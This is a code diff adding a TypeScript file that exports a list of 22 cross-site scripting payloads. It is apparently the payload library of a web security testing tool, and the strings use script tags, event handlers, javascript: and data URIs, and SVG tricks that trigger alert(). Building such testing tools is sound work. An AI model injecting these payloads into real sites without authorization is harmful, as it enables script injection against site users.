@@ -1,0 +1,26 @@
+import type { PayloadItem } from '../types'
+
+export const XSS_PAYLOADS: PayloadItem[] = [
+  { id: 'xss-1', category: 'xss', featured: true, label: 'Script alert', value: '<script>alert("Katch!")</script>' },
+  { id: 'xss-2', category: 'xss', featured: true, label: 'IMG onerror', value: '<img src=x onerror=alert("Katch!")>' },
+  { id: 'xss-3', category: 'xss', featured: true, label: 'SVG onload', value: '<svg onload=alert("Katch!")>' },
+  { id: 'xss-4', category: 'xss', featured: true, label: 'JS protocol', value: 'javascript:alert("Katch!")' },
+  { id: 'xss-5', category: 'xss', featured: true, label: 'Body onload', value: '"><body onload=alert("Katch!")>' },
+  { id: 'xss-6', category: 'xss', featured: true, label: 'Encoded script', value: '&lt;script&gt;alert(1)&lt;/script&gt;' },
+  { id: 'xss-7', category: 'xss', featured: true, label: 'Iframe src', value: '<iframe src="javascript:alert(1)">' },
+  { id: 'xss-8', category: 'xss', featured: true, label: 'Input autofocus', value: '<input autofocus onfocus=alert(1)>' },
+  { id: 'xss-9', category: 'xss', label: 'Details ontoggle', value: '<details open ontoggle=alert(1)>' },
+  { id: 'xss-10', category: 'xss', label: 'MathML', value: '<math><mtext></mtext><script>alert(1)</script></math>' },
+  { id: 'xss-11', category: 'xss', label: 'SVG animate', value: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>' },
+  { id: 'xss-12', category: 'xss', label: 'Object data', value: '<object data="javascript:alert(1)">' },
+  { id: 'xss-13', category: 'xss', label: 'Event breakout', value: '" onmouseover="alert(1)" x="' },
+  { id: 'xss-14', category: 'xss', label: 'Template literal', value: '${alert(1)}' },
+  { id: 'xss-15', category: 'xss', label: 'HTML5 video', value: '<video><source onerror=alert(1)>' },
+  { id: 'xss-16', category: 'xss', label: 'Marquee', value: '<marquee onstart=alert(1)>' },
+  { id: 'xss-17', category: 'xss', label: 'Base href', value: '<base href="javascript://">' },
+  { id: 'xss-18', category: 'xss', label: 'Form action', value: '<form action="javascript:alert(1)"><input type=submit>' },
+  { id: 'xss-19', category: 'xss', label: 'Style expression', value: '<div style="width:expression(alert(1))">' },
+  { id: 'xss-20', category: 'xss', label: 'Data URI', value: '<a href="data:text/html,<script>alert(1)</script>">x</a>' },
+  { id: 'xss-21', category: 'xss', featured: true, label: 'IMG srcdoc', value: '<iframe srcdoc="<script>alert(1)</script>">' },
+  { id: 'xss-22', category: 'xss', featured: true, label: 'SVG use href', value: '<svg><use href="data:image/svg+xml,<svg id=x onload=alert(1)>"/></svg>' },
+]
